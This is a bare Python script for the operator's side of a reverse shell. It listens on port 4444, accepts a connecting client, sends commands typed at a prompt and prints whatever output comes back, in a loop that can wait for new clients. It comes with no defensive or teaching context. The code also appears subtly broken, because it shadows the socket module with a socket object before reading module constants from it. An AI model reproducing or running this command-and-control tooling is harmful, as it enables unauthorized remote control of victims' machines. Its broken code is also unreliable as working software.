import sys, socket

SERVER_IP = "" 
PORT = 4444

socket = socket.socket()
socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
socket.bind((SERVER_IP, PORT))

socket.listen(1)

while True:
    print(f'[+] listening as {SERVER_IP}:{PORT}')
    client = socket.accept()
    print(f'[+] client connected {client[1]}')

    client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break
        result = client[0].recv(1024).decode()
        print(result)
    client[0].close()
    cmd = input('Wait for new client y/n') or 'y'
    if cmd.lower() in ['n', 'no']:
        break
socket.close()